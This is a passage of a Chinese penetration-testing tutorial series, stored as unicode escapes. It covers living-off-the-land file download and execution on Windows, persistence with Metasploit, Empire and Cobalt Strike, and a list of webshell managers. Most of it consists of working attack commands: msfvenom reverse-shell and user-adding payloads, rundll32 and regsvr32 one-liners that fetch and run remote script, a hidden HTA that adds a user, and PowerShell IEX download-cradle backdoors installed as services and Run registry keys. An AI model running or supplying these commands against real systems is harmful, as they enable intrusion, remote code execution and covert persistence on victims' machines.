4\u3001wget Windows\u73af\u5883\u4e0b\uff0c\u53ef\u4e0a\u4f20\u514d\u5b89\u88c5\u7684\u53ef\u6267\u884c\u7a0b\u5e8fwget.exe\u5230\u76ee\u6807\u673a\u5668\uff0c\u4f7f\u7528wget\u4e0b\u8f7d\u6587\u4ef6\u3002 wget.exe\u4e0b\u8f7d\uff1a https://eternallybored.org/misc/wget/ wget -O \"evil.txt\" http://192.168.28.128/imag/evil.txt 5\u3001ipc$\u6587\u4ef6\u5171\u4eab IPC$(Internet Process Connection)\u662f\u5171\u4eab\"\u547d\u540d\u7ba1\u9053\"\u7684\u8d44\u6e90\uff0c\u5b83\u662f\u4e3a\u4e86\u8ba9\u8fdb\u7a0b\u95f4\u901a\u4fe1\u800c\u5f00\u653e\u7684\u547d\u540d\u7ba1\u9053\uff0c\u901a\u8fc7\u63d0\u4f9b\u53ef\u4fe1\u4efb\u7684\u7528\u6237\u540d\u548c\u53e3\u4ee4\uff0c\u8fde\u63a5\u53cc\u65b9\u53ef\u4ee5\u5efa\u7acb\u5b89\u5168\u7684\u901a\u9053\u5e76\u4ee5\u6b64\u901a\u9053\u8fdb\u884c\u52a0\u5bc6\u6570\u636e\u7684\u4ea4\u6362\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u8bbf\u95ee\u3002 #\u5efa\u7acb\u8fdc\u7a0bIPC\u8fde\u63a5 net use \\\\192.168.28.128\\ipc$ /user:administrator \"abc123!\" #\u590d\u5236\u8fdc\u7a0b\u6587\u4ef6\u5230\u672c\u5730\u4e3b\u673a copy \\\\192.168.28.128\\c$\\2.txt D:\\test 6\u3001FTP \u4e00\u822c\u60c5\u51b5\u4e0b\u653b\u51fb\u8005\u4f7f\u7528FTP\u4e0a\u4f20\u6587\u4ef6\u9700\u8981\u5f88\u591a\u4ea4\u4e92\u7684\u6b65\u9aa4\uff0c\u4e0b\u9762\u8fd9\u4e2a bash\u811a\u672c\uff0c\u8003\u8651\u5230\u4e86\u4ea4\u4e92\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5e76\u4e0d\u4f1a\u4ea7\u751f\u4ea4\u4e92\u52a8\u4f5c\u3002 ftp 127.0.0.1 username password get file exit 7\u3001TFTP \u7528\u6765\u4e0b\u8f7d\u8fdc\u7a0b\u6587\u4ef6\u7684\u6700\u7b80\u5355\u7684\u7f51\u7edc\u534f\u8bae\uff0c\u5b83\u57fa\u4e8eUDP\u534f\u8bae\u800c\u5b9e\u73b0 tftp32\u670d\u52a1\u7aef\u4e0b\u8f7d\u5730\u5740\uff1a http://tftpd32.jounin.net/tftpd32_download.html tftp -i \u4f60\u7684IP get \u8981\u4e0b\u8f7d\u6587\u4ef6 \u5b58\u653e\u4f4d\u7f6e 8\u3001WinScp WinSCP\u662f\u4e00\u4e2aWindows\u73af\u5883\u4e0b\u4f7f\u7528SSH\u7684\u5f00\u6e90\u56fe\u5f62\u5316SFTP\u5ba2\u6237\u7aef\u3002 #\u4e0a\u4f20 winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"put D:\\1.txt /tmp/\" \"exit\" /log=log_file.txt #\u4e0b\u8f7d winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"get /tmp D:\\test\\app\\\" \"exit\" /log=log_file.tx \u4f7f\u7528winscp.exe \u4f5c\u4e3a\u547d\u4ee4\u884c\u53c2\u6570\u6267\u884c\u8fdc\u7a0b\u4e0a\u4f20/\u4e0b\u8f7d\u64cd\u4f5c\u3002 9\u3001msiexec msiexec \u652f\u6301\u8fdc\u7a0b\u4e0b\u8f7d\u529f\u80fd\uff0c\u5c06msi\u6587\u4ef6\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u8fdc\u7a0b\u6267\u884c\uff1a #\u751f\u6210msi\u5305 msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi #\u8fdc\u7a0b\u6267\u884c msiexec /q /i http://192.168.28.128/evil.msi \u6210\u529f\u6dfb\u52a0\u4e86\u4e00\u4e2atest\u7528\u6237\uff1a 10\u3001IEExec IEexec.exe\u5e94\u7528\u7a0b\u5e8f\u662f.NET Framework\u9644\u5e26\u7a0b\u5e8f\uff0c\u5b58\u5728\u4e8e\u591a\u4e2a\u7cfb\u7edf\u767d\u540d\u5355\u5185\u3002 \u751f\u6210Payload\uff1a msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe \u4f7f\u7528\u7ba1\u7406\u5458\u8eab\u4efd\u6253\u5f00cmd\uff0c\u5206\u522b\u8fd0\u884c\u4e0b\u9762\u4e24\u6761\u547d\u4ee4\u3002 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727>caspol.exe -s off C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe 11\u3001mshta mshta\u7528\u4e8e\u6267\u884c.hta\u6587\u4ef6\uff0c\u800chta\u662fHTML Applocation \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662fHTML\u5e94\u7528\u7a0b\u5e8f\u3002\u800chta\u4e2d\u4e5f\u652f\u6301VBS\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528hta\u6765\u4e0b\u8f7d\u6587\u4ef6\u3002 mshta http://192.168.28.128/run.hta run.hta\u5185\u5bb9\u5982\u4e0b\uff1a <HTML> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"> <HEAD> <script language=\"VBScript\"> Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(\"Wscript.Shell\") objShell.Run \"cmd.exe /c net user test password /add\" // \u8fd9\u91cc\u586b\u5199\u547d\u4ee4 self.close </script> <body> demo </body> </HEAD> </HTML> 12\u3001rundll32 \u5176\u5b9e\u8fd8\u662f\u4f9d\u8d56\u4e8eWScript.shell\u8fd9\u4e2a\u7ec4\u4ef6\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528JSRat\u6765\u505a\u6f14\u793a\uff0cJSRat\u662f\u4e00\u4e2a\u547d\u4ee4\u548c\u63a7\u5236\u6846\u67b6\uff0c\u4ec5\u4e3arundll32.exe\u548cregsvr32.exe\u751f\u6210\u6076\u610f\u7a0b\u5e8f\u3002 \u9879\u76ee\u5730\u5740\uff1a https://github.com/Hood3dRob1n/JSRat-Py.git \u6b65\u9aa4\u4e00\uff1a\u5f00\u59cb\u8fd0\u884cJSRat\uff0c\u76d1\u542c\u672c\u57308888\u7aef\u53e3\u3002 \u6b65\u9aa4\u4e8c\uff1a\u901a\u8fc7url\u8bbf\u95ee\uff0c\u53ef\u4ee5\u67e5\u770b\u6076\u610f\u4ee3\u7801\u3002 \u590d\u5236\u4ee3\u7801\u5982\u4e0b\uff1a rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.28.131:8888/connect\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);} \u6b65\u9aa4\u4e09\uff1a\u5728\u53d7\u5bb3\u8005PC\u8fd0\u884c\u8be5\u4ee3\u7801\uff0c\u5c06\u6210\u529f\u8fd4\u56de\u4e00\u4e2a\u4f1a\u8bdd\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 13\u3001regsvr32 Regsvr32\u547d\u4ee4\u7528\u4e8e\u6ce8\u518cCOM\u7ec4\u4ef6\uff0c\u662fWindows\u7cfb\u7edf\u63d0\u4f9b\u7684\u7528\u6765\u5411\u7cfb\u7edf\u6ce8\u518c\u63a7\u4ef6\u6216\u8005\u5378\u8f7d\u63a7\u4ef6\u7684\u547d\u4ee4\uff0c\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u8fd0\u884c \u5728\u76ee\u6807\u673a\u4e0a\u6267\u884c\uff1a regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll \u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u6784\u9020.sct\u6587\u4ef6\uff0c\u53bb\u4e0b\u8f7d\u6267\u884c\u6211\u4eec\u7684\u7a0b\u5e8f <?XML version=\"1.0\"?> <scriptlet> <registration progid=\"ShortJSRAT\" classid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" > <script language=\"JScript\"> <![CDATA[ ps = \"cmd.exe /c calc.exe\"; new ActiveXObject(\"WScript.Shell\").Run(ps,0,true); ]]> </script> </registration> </scriptlet> \u6267\u884c\u547d\u4ee4\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668\uff1a 14\u3001MSXSL.EXE msxsl.exe\u662f\u5fae\u8f6f\u7528\u4e8e\u547d\u4ee4\u884c\u4e0b\u5904\u7406XSL\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u901a\u8fc7\u4ed6\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884cJavaScript\u8fdb\u800c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 \u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=21714 msxsl.exe \u9700\u8981\u63a5\u53d7\u4e24\u4e2a\u6587\u4ef6\uff0cXML\u53caXSL\u6587\u4ef6\uff0c\u53ef\u4ee5\u8fdc\u7a0b\u52a0\u8f7d\uff0c\u5177\u4f53\u65b9\u5f0f\u5982\u4e0b\uff1a msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl demo.xml <?xml version=\"1.0\"?> <?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?> <customers> <customer> <name>Microsoft</name> </customer> </customers> exec.xsl <?xml version='1.0'?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"http://mycompany.com/mynamespace\"> <msxsl:script language=\"JScript\" implements-prefix=\"user\"> function xml(nodelist) { var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\"); return nodelist.nextNode().xml; } </msxsl:script> <xsl:template match=\"/\"> <xsl:value-of select=\"user:xml(.)\"/> </xsl:template> </xsl:stylesheet> 15\u3001pubprn.vbs \u5728Windows 7\u4ee5\u4e0a\u7248\u672c\u5b58\u5728\u4e00\u4e2a\u540d\u4e3aPubPrn.vbs\u7684\u5fae\u8f6f\u5df2\u7b7e\u540dWSH\u811a\u672c\uff0c\u5176\u4f4d\u4e8eC:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8be5\u811a\u672c\u53ef\u4ee5\u53d1\u73b0\u5176\u663e\u7136\u662f\u7531\u7528\u6237\u63d0\u4f9b\u8f93\u5165\uff08\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\uff09\uff0c\u4e4b\u540e\u518d\u5c06\u53c2\u6570\u4f20\u9012\u7ed9GetObject() \"C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct test.sct <?XML version=\"1.0\"?> <scriptlet> <registration description=\"Bandit\" progid=\"Bandit\" version=\"1.00\" classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\" remotable=\"true\" > </registration> <script language=\"JScript\"> <![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]> </script> </scriptlet> \u53c2\u8003\u6587\u7ae0\uff1a https://xz.aliyun.com/t/1654/ https://evi1cg.me/archives/remote_exec.html \u6536\u96c6\u6574\u7406\u768415\u79cd\u6587\u4ef6\u4e0b\u8f7d\u7684\u65b9\u5f0f https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A Windows\u6267\u884c\u547d\u4ee4\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3 https://www.cnblogs.com/17bdw/p/8550189.html \u5728windows\u4e0a\u6267\u884c\u6076\u610f\u4ee3\u7801 by rundll32 & regsvr32 https://www.jianshu.com/p/e8f65deac245 IEexec.exe\u6267\u884cpayload https://www.codercto.com/a/104908.html rundll32.exe \u591a\u79cd\u65b9\u6cd5\u7ed5\u8fc7\u767d\u540d\u5355 https://www.cnblogs.com/backlion/p/10488747.html \u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f \u00b6 0x00 \u524d\u8a00 \u00b6 \u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6709\u4e09\u4e2a\u975e\u5e38\u7ecf\u5178\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6----Metasploit\u3001Empire\u3001Cobalt Strike\u3002 \u90a3\u4e48\uff0c\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u5230\u76ee\u6807\u4e3b\u673a\u6743\u9650\u540e\uff0c\u5982\u4f55\u5229\u7528\u6846\u67b6\u83b7\u5f97\u6301\u4e45\u6027\u6743\u9650\u5462\uff1f 0x01 MSF\u6743\u9650\u7ef4\u6301 \u00b6 \u4f7f\u7528MSF\u7ef4\u6301\u6743\u9650\u7684\u524d\u63d0\u662f\u5148\u83b7\u5f97\u4e00\u4e2a*meterpreter* shell\uff0c\u901a\u8fc7*meterpreter* shell\u83b7\u53d6\u6301\u4e45\u6027shell\u7684\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a Persistence\u6a21\u5757 \u901a\u8fc7\u542f\u52a8\u9879\u542f\u52a8(persistence)\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4ee5\u53cd\u5f39\u56de\u8fde\u3002 -U\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7528\u6237\u767b\u5f55\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u63a8\u8350\u4f7f\u7528\u8be5\u53c2\u6570\uff1b -X\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7cfb\u7edf\u542f\u52a8\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u7531\u4e8e\u6743\u9650\u95ee\u9898\uff0c\u4f1a\u5bfc\u81f4\u6dfb\u52a0\u5931\u8d25\uff0c\u540e\u95e8\u5c06\u65e0\u6cd5\u542f\u52a8\u3002 -S\uff1a\u4f5c\u4e3a\u670d\u52a1\u81ea\u52a8\u542f\u52a8\u4ee3\u7406\u7a0b\u5e8f\uff08\u5177\u6709SYSTEM\u6743\u9650\uff09 \u751f\u6210\u7684\u76f8\u5173\u6587\u4ef6\u4f4d\u7f6e \uff1a # \u540e\u95e8\u6587\u4ef6\u4f4d\u7f6e\uff1a C:\\Windows\\Temp C:\\Users\\Administrator\\AppData\\Local\\Temp # \u6ce8\u518c\u8868\u4f4d\u7f6e\uff1a HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ Metsvc \u6a21\u5757 \u901a\u8fc7\u670d\u52a1(metsvc)\u542f\u52a8\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u542f\u52a8\u540e\u81ea\u542f\u52a8\u4e00\u4e2a\u670d\u52a1\uff0c\u7b49\u5f85\u8fde\u63a5\u3002 \u540e\u95e8\u6392\u67e5\uff1a\u76ee\u6807\u4e3b\u673a\u4e0a\u5f00\u542f\u4e86\u4e00\u4e2aMeterpreter\u670d\u52a1\u3002 0x02 Empire \u6743\u9650\u7ef4\u6301 \u00b6 Empire\u7684persistence\u6a21\u5757\u63d0\u4f9b\u4e8618\u79cd\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5\uff0c\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u56db\u7c7b\uff0c\u5373 elevated\uff08\u7ba1\u7406\u6743\u9650\uff09 misc\uff08\u6742\u9879\uff09 powerbreach userland\uff08\u7528\u6237\u6743\u9650\uff09 registry* add_netuser deaduser backdoor_lnk schtasks* add_sid_history* eventlog* registry wmi* debugger* resolver schtasks wmi_updater* disable_machine_acct_change* get_ssps install_ssp* memssp* skeleton_key* \u6ce8\u518c\u8868 (Empire: agents) > agents (Empire: agents) > interact URL3FZBV (Empire: URL3FZBV) > usemodule persistence/elevated/registry* (Empire: powershell/persistence/elevated/registry) > set Listener test (Empire: powershell/persistence/elevated/registry) > execute \u56e0\u4e3a\u662f\u5f00\u673a\u542f\u52a8\uff0c\u6240\u4ee5\u4f1a\u5f39\u4e2a\u9ed1\u6846\uff0c\u4e4b\u540e\u8fd8\u4f1a\u5f39\u51fa\u6ce8\u518c\u8868\u6dfb\u52a0\u7684powershell\u542f\u52a8\u9879\u7684\u6846\uff0c\u5728\u6ce8\u518c\u8868\u4f4d\u7f6e\u5982\u4e0b\uff1a \u8ba1\u5212\u4efb\u52a1 (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/schtasks* (Empire: powershell/persistence/elevated/schtasks) > set Listener test (Empire: powershell/persistence/elevated/schtasks) > set DailyTime 22:50 (Empire: powershell/persistence/elevated/schtasks) > execute \u5728\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u5e93\u53ef\u4ee5\u770b\u5230-\u4efb\u52a1\u4e3aUpdater-\u542f\u52a8\u7a0b\u5e8f\u5982\u4e0b\u53ef\u4ee5\u5230\u4e3apowershell wmi (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/wmi (Empire: powershell/persistence/elevated/wmi) > set Listener test (Empire: powershell/persistence/elevated/wmi) > run \u5982\u4f55\u6e05\u9664\u540e\u95e8\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528Autoruns\uff0c\u9009\u62e9WMI\u9009\u9879\u5361\uff0c\u53f3\u952e\u5c31\u53ef\u4ee5\u5220\u9664\u6076\u610f\u540e\u95e8\u3002 0x03 Cobalt Strike\u6743\u9650\u7ef4\u6301 \u00b6 \u901a\u8fc7Cobalt Strike\u62ff\u5230\u4e00\u4e2ashell\uff0c\u7559\u540e\u95e8\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e24\u79cd\u6bd4\u8f83\u5e38\u89c1\u7684\u65e0\u6587\u4ef6\u3001\u81ea\u542f\u52a8\u540e\u95e8\u3002 \u4eceCobalt Strike\u83dc\u5355\u680f\uff0cAttacks--Web Drive-by--Scaripted Web Delivery\uff0c\u751f\u6210powershell\u540e\u95e8\u3002 \u6839\u636e\u9700\u8981\u53ef\u4ee5\u81ea\u5df1\u9009\u62e9\uff0c\u586b\u5199\u6240\u9700\u53c2\u6570\u9ed8\u8ba4\u7aef\u53e3\u662f80\uff08\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u4e0d\u8981\u4f7f\u7528\u91cd\u590d\u7aef\u53e3\uff09\uff0cType\u9009\u62e9powershell\u3002 \u70b9\u51fbLaunch\u540e\uff0c\u8fd4\u56depowershell\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u547d\u4ee4\u3002 \u670d\u52a1\u81ea\u542f\u52a8\u540e\u95e8 sc create \"Name\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" sc description Name \"Just For Test\" //\u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config Name start= auto //\u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start Name //\u542f\u52a8\u670d\u52a1 \u91cd\u542f\u670d\u52a1\u5668\u540e\uff0c\u6210\u529f\u8fd4\u56de\u4e00\u4e2ashell\u3002 \u6ce8\u518c\u8868\u81ea\u542f\u52a8 \u5728windows\u542f\u52a8\u9879\u6ce8\u518c\u8868\u91cc\u9762\u6dfb\u52a0\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f\u8def\u5f84\uff0c\u5982\uff1a beacon>getsystem beacon>shell reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" /f \u8d26\u53f7\u6ce8\u9500\u540e\uff0c\u91cd\u65b0\u767b\u5f55\uff0c\u754c\u9762\u4e0a\u4f1a\u51fa\u73b0powershell\u5feb\u901f\u95ea\u8fc7\u6d88\u5931\uff0c\u6210\u529f\u8fd4\u56deshell\u3002 \u6ce8\u518c\u8868\u8fd8\u6709\u54ea\u4e9b\u952e\u503c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u81ea\u542f\u52a8\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon 0x04 \u7ed3\u675f\u8bed \u00b6 \u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u901a\u8fc7\u4e09\u5927\u6e17\u900f\u6846\u67b6\u8fdb\u884c\u6743\u9650\u7ef4\u6301\u7684\u51e0\u79cd\u65b9\u6cd5\uff0c\u4e86\u89e3\u653b\u51fb\u8005\u5e38\u7528\u7684\u6e17\u900f\u6846\u67b6\u53ca\u540e\u95e8\u6280\u672f\uff0c\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u53bb\u53d1\u73b0\u5e76\u89e3\u51b3\u670d\u52a1\u5668\u5b89\u5168\u95ee\u9898\u3002 \u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177 \u00b6 \u653b\u51fb\u8005\u5728\u5165\u4fb5\u7f51\u7ad9\u65f6\uff0c\u901a\u5e38\u8981\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u5199\u5165Webshell\uff0c\u4ece\u800c\u83b7\u5f97\u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u6bd4\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3001\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u3001\u7a83\u53d6\u7528\u6237\u6570\u636e\uff0c\u7be1\u6539\u7f51\u7ad9\u9875\u9762\u7b49\u64cd\u4f5c\u3002 \u672c\u6587\u4ecb\u7ecd\u5341\u6b3e\u5e38\u7528\u7684Webshell\u7ba1\u7406\u5de5\u5177\uff0c\u4ee5\u4f9b\u4f60\u9009\u62e9\uff0c\u4f60\u4f1a\u9009\u62e9\u54ea\u4e00\u4e2a\uff1f 1\u3001\u4e2d\u56fd\u83dc\u5200(Chopper) \u4e2d\u56fd\u83dc\u5200\u662f\u4e00\u6b3e\u4e13\u4e1a\u7684\u7f51\u7ad9\u7ba1\u7406\u8f6f\u4ef6\uff0c\u7528\u9014\u5e7f\u6cdb\uff0c\u4f7f\u7528\u65b9\u4fbf\uff0c\u5c0f\u5de7\u5b9e\u7528\u3002\u53ea\u8981\u652f\u6301\u52a8\u6001\u811a\u672c\u7684\u7f51\u7ad9\uff0c\u90fd\u53ef\u4ee5\u7528\u4e2d\u56fd\u83dc\u5200\u6765\u8fdb\u884c\u7ba1\u7406\uff01\u5728\u975e\u7b80\u4f53\u4e2d\u6587\u73af\u5883\u4e0b\u4f7f\u7528\uff0c\u81ea\u52a8\u5207\u6362\u5230\u82f1\u6587\u754c\u9762\u3002UNICODE\u65b9\u5f0f\u7f16\u8bd1\uff0c\u652f\u6301\u591a\u56fd\u8bed\u8a00\u8f93\u5165\u663e\u793a\u3002 2\u3001\u8681\u5251(AntSword) AntSword\u662f\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\uff0c\u8de8\u5e73\u53f0\u7684\u7f51\u7ad9\u7ba1\u7406\u5de5\u5177\uff0c\u65e8\u5728\u6ee1\u8db3\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u4ee5\u53ca\u5177\u6709\u6743\u9650\u548c/\u6216\u6388\u6743\u7684\u5b89\u5168\u7814\u7a76\u4eba\u5458\u4ee5\u53ca\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u9700\u6c42\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/AntSwordProject/antSword 3\u3001C\u5200(Cknife) \u8fd9\u662f\u4e00\u6b3e\u8de8\u5e73\u53f0\u7684\u57fa\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\u4e2d\u56fd\u83dc\u5200\uff0c\u628a\u6240\u6709\u64cd\u4f5c\u7ed9\u4e88\u7528\u6237\u6765\u5b9a\u4e49\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/Chora10/Cknife 4\u3001\u51b0\u874e(Behinder) \u51b0\u874e\u201d\u662f\u4e00\u6b3e\u52a8\u6001\u4e8c\u8fdb\u5236\u52a0\u5bc6\u7f51\u7ad9\u7ba1\u7406\u5ba2\u6237\u7aef\u3002 github\u5730\u5740\uff1a https://github.com/rebeyond/Behinder 5\u3001Xise XISE WebShell\u7ba1\u7406\u5de5\u5177\u3002 6\u3001Altman Altman3\u662f\u4e00\u6b3e\u6e17\u900f\u6d4b\u8bd5\u8f6f\u4ef6\uff0c\u57fa\u4e8e.Net4.0\u5f00\u53d1\uff0c\u4f9d\u6258Eto.Form\u53ef\u4ee5\u5b8c\u7f8e\u8fd0\u884c\u5728Windows\u3001Linux\u3001Mac\u7b49\u591a\u4e2a\u5e73\u53f0\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/keepwn/Altman 7\u3001Weevely Weevely\u662f\u4e00\u79cdPython\u7f16\u5199\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u8de8\u5e73\u53f0\uff0c\u53ea\u652f\u6301PHP\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/epinna/weevely3 \u7528\u6cd5\u793a\u4f8b\uff1a weevely generate <password> <path> weevely <URL> <password> [cmd] \u540c\u65f6\uff0c\u5728Kali 2.0 \u7248\u672c\u4e0b\uff0c\u96c6\u6210\u4e86\u4e09\u6b3eWeb\u540e\u95e8\u5de5\u5177\uff1aWebaCoo\u3001weevely\u3001PHP Meterpreter\u3002 8\u3001QuasiBot QuasiBot\u662f\u4e00\u6b3ephp\u7f16\u5199\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u53ef\u4ee5\u5bf9webshell\u8fdb\u884c\u8fdc\u7a0b\u6279\u91cf\u7ba1\u7406\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/Smaash/quasibot 9\u3001Webshell-Sniper \u8fd9\u662f\u4e00\u6b3e\u57fa\u4e8e\u7ec8\u7aef\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u4ec5\u652f\u6301\u5728\u7c7bUnix\u7cfb\u7edf\u4e0a\u8fd0\u884c\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/WangYihang/Webshell-Sniper \u7528\u6cd5\u793a\u4f8b\uff1a Usage : python webshell-sniper.py [URL] [METHOD] [AUTH] Example : python webshell-sniper.py http://127.0.0.1/c.php POST c 10\u3001WebshellManager \u4e00\u6b3e\u7528PHP+Mysql\u5199\u7684\u4e00\u53e5\u8bddWEB\u7aef\u7ba1\u7406\u5de5\u5177\uff0c\u76ee\u524d\u4ec5\u652f\u6301\u5bf9PHP\u7684\u4e00\u53e5\u8bdd\u8fdb\u884c\u64cd\u4f5c\u3002 github\u9879\u76ee\u5730\u5740\uff1a 